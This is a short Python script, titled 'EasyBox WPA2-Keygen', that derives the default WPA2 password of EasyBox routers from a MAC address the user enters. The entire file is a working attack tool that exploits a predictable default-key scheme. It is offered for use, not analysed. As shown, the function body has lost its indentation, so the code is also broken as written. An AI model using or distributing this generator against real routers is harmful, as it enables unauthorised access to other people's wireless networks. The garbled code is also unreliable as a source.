#!/usr/bin/env python

def keygen( mac ):
bytes = [int(x, 16) for x in mac.split(':')]

c1 = (bytes[-2] << 8) + bytes[-1]
(s6, s7, s8, s9, s10) = [int(x) for x in '%05d' % (c1)]
(m7, m8, m9, m10, m11, m12) = [int(x, 16) for x in mac.replace(':', '')[6:]]

k1 = (s7 + s8 + m11 + m12) & (0x0F)
k2 = (m9 + m10 + s9 + s10) & (0x0F)

x1 = k1 ^ s10
x2 = k1 ^ s9
x3 = k1 ^ s8
y1 = k2 ^ m10
y2 = k2 ^ m11
y3 = k2 ^ m12
z1 = m11 ^ s10
z2 = m12 ^ s9
z3 = k1 ^ k2

return "%X%X%X%X%X%X%X%X%X" % (x1, y1, z1, x2, y2, z2, x3, y3, z3)

print("EasyBox WPA2-Keygen by Sebastian Petters")
print("http://www.wotan.cc")
mac = raw_input("MAC: ")
print( keygen(mac) )
